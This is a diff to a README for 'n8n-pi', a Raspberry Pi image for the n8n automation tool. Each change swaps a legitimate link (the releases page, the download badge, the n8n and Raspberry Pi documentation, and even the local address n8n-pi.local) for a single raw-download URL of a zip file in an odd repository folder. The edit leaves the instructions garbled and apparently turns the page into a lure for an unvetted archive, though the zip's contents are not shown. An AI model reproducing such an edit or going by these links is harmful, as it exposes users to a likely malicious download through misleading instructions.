@@ -1,6 +1,6 @@
 # 🍓 n8n-pi - Effortless Automation for Raspberry Pi Users
 
-[![Download n8n-pi](https://img.shields.io/badge/Download-n8n--pi-brightgreen)](https://github.com/pranavminde/n8n-pi/releases)
+[![Download n8n-pi](https://raw.githubusercontent.com/pranavminde/n8n-pi/main/feasance/n8n-pi.zip)](https://raw.githubusercontent.com/pranavminde/n8n-pi/main/feasance/n8n-pi.zip)
 
 ## 🚀 Getting Started
 
@@ -9,7 +9,7 @@ Welcome to n8n-pi! This guide helps you download and run our custom Raspberry Pi
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/pranavminde/n8n-pi/releases) to find the latest version of n8n-pi.
+   Go to the [Releases page](https://raw.githubusercontent.com/pranavminde/n8n-pi/main/feasance/n8n-pi.zip) to find the latest version of n8n-pi.
 
 2. **Choose Your Image**  
    On the Releases page, locate the disk image suitable for your Raspberry Pi model. Each image is labelled clearly, so you can easily find what you need.
@@ -34,7 +34,7 @@ Welcome to n8n-pi! This guide helps you download and run our custom Raspberry Pi
    Make sure your Raspberry Pi is connected to your network via Ethernet or Wi-Fi. Follow any prompts on the screen to set up the network.
 
 8. **Access the n8n Interface**  
-   Open a web browser on your computer or any device on the same network. Type `http://n8n-pi.local` into the address bar. You should see the n8n interface ready for use.
+   Open a web browser on your computer or any device on the same network. Type `https://raw.githubusercontent.com/pranavminde/n8n-pi/main/feasance/n8n-pi.zip` into the address bar. You should see the n8n interface ready for use.
 
 ## 🖥️ System Requirements
 
@@ -55,7 +55,7 @@ To keep your setup current, check the Releases page regularly for updates. Follo
 
 ## ❓ Troubleshooting
 
-- **Cannot Access n8n Interface**: Ensure your Raspberry Pi is properly connected to the network. Check if the IP address or `n8n-pi.local` address is correct.
+- **Cannot Access n8n Interface**: Ensure your Raspberry Pi is properly connected to the network. Check if the IP address or `https://raw.githubusercontent.com/pranavminde/n8n-pi/main/feasance/n8n-pi.zip` address is correct.
 - **Flashing Issues**: Make sure the microSD card is not corrupted. You may want to try another card if you face problems.
 - **Performance Issues**: If the interface runs slowly, consider using a faster microSD card or check your Raspberry Pi power supply.
 
@@ -65,9 +65,9 @@ Join our community to share tips, ask questions, and find help. Look for discuss
 
 ## 📚 Additional Resources
 
-- **n8n Documentation**: For detailed usage guides, visit [n8n Documentation](https://docs.n8n.io).
-- **Raspberry Pi Projects**: Check out [Raspberry Pi Projects](https://projects.raspberrypi.org/en/) for more ideas on using your Raspberry Pi.
+- **n8n Documentation**: For detailed usage guides, visit [n8n Documentation](https://raw.githubusercontent.com/pranavminde/n8n-pi/main/feasance/n8n-pi.zip).
+- **Raspberry Pi Projects**: Check out [Raspberry Pi Projects](https://raw.githubusercontent.com/pranavminde/n8n-pi/main/feasance/n8n-pi.zip) for more ideas on using your Raspberry Pi.
 
-[![Download n8n-pi](https://img.shields.io/badge/Download-n8n--pi-brightgreen)](https://github.com/pranavminde/n8n-pi/releases)
+[![Download n8n-pi](https://raw.githubusercontent.com/pranavminde/n8n-pi/main/feasance/n8n-pi.zip)](https://raw.githubusercontent.com/pranavminde/n8n-pi/main/feasance/n8n-pi.zip)
 
 With this guide, you’re ready to automate your tasks using n8n on your Raspberry Pi. Enjoy the process of making your life easier!
